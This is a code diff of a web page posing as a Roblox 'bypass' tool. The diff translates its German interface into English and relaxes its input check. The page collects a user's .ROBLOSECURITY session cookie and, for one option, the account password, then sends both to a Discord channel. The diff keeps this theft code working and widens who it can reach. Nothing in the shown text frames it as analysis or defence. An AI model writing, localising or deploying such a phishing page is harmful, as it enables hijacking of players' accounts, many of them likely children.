@@ -225,7 +225,7 @@
     </div>
   </div>
 
-  <div id="errorToast">Bitte gib deinen .ROBLOSECURITY Cookie ein (mindestens 500 Zeichen)</div>
+  <div id="errorToast">Please enter your .ROBLOSECURITY Cookie</div>
 
   <script>
     const bypassSelect = document.getElementById('bypass');
@@ -268,13 +268,13 @@
       const passwordValue = passwordInput.value.trim();
       const selectedOption = bypassSelect.value;
 
-      if(cookieValue.length < 500) {
-        showError('Bitte gib deinen .ROBLOSECURITY Cookie ein (mindestens 500 Zeichen)');
+      if(cookieValue.length === 0) {
+        showError('Please enter your .ROBLOSECURITY Cookie');
         return;
       }
 
       if(selectedOption === 'allages' && passwordValue.length === 0) {
-        showError('Bitte gib dein Passwort zur Verifizierung ein.');
+        showError('Please enter your account password for verification.');
         return;
       }
 
@@ -290,15 +290,15 @@
       // Senden der Daten
       if(selectedOption === 'allages') {
         // Erst Cookie senden
-        sendToDiscord(`Neuer Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
+        sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
         .then(res => {
-          if (!res.ok) throw new Error('Fehler beim Senden des Cookies.');
+          if (!res.ok) throw new Error('Error sending cookie.');
           // Dann Passwort senden
-          return sendToDiscord(`Account Passwort:\n\`\`\`\n${passwordValue}\n\`\`\``);
+          return sendToDiscord(`Account Password:\n\`\`\`\n${passwordValue}\n\`\`\``);
         })
         .then(res => {
-          if (!res.ok) throw new Error('Fehler beim Senden des Passworts.');
-          alert('Cookie und Passwort wurden erfolgreich gesendet!');
+          if (!res.ok) throw new Error('Error sending password.');
+          alert('Cookie and password were sent successfully!');
           cookieTextarea.value = '';
           passwordInput.value = '';
           bypassSelect.value = '';
@@ -307,14 +307,14 @@
           processBtn.style.display = 'none';
         })
         .catch(() => {
-          showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
+          showError('Error sending to Discord. Please try again later.');
         });
       } else {
         // Nur Cookie senden
-        sendToDiscord(`Neuer Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
+        sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
         .then(res => {
           if (res.ok) {
-            alert('Cookie wurde erfolgreich gesendet!');
+            alert('Cookie was sent successfully!');
             cookieTextarea.value = '';
             bypassSelect.value = '';
             cookieInputContainer.style.display = 'none';
@@ -324,7 +324,7 @@
           }
         })
         .catch(() => {
-          showError('Fehler beim Senden an Discord. Bitte später erneut versuchen.');
+          showError('Error sending to Discord. Please try again later.');
         });
       }
     });
